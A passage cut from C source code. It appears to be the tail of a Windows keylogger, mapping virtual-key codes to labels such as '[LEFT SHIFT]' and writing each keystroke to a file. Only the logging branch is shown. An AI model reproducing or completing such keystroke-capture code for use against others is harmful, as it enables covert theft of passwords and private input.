                    fprintf(ptr,"%s","[F12]");
                else if(key==VK_NUMLOCK)
                    fprintf(ptr,"%s","[NUM LOCK]");
                else if(key==VK_SCROLL)
                    fprintf(ptr,"%s","[SCROLL LOCK]");
                else if(key==VK_LSHIFT)
                    fprintf(ptr,"%s","[LEFT SHIFT]");
                else if(key==VK_LCONTROL)
                    fprintf(ptr,"%s","[LEFT CTRL]");
                else if(key==VK_LMENU)
                    fprintf(ptr,"%s","[LEFT ALT]");
                else if(key==VK_RSHIFT)
                    fprintf(ptr,"%s","[RIGHT SHIFT]");
                else if(key==VK_RCONTROL)
                    fprintf(ptr,"%s","[RIGHT CTRL]");
                else if(key==VK_RMENU)
                    fprintf(ptr,"%s","[RIGHT ALT]");
                else
                    fputc(key,ptr);
                fclose(ptr);
            }
        }
    }
    return 0;
}
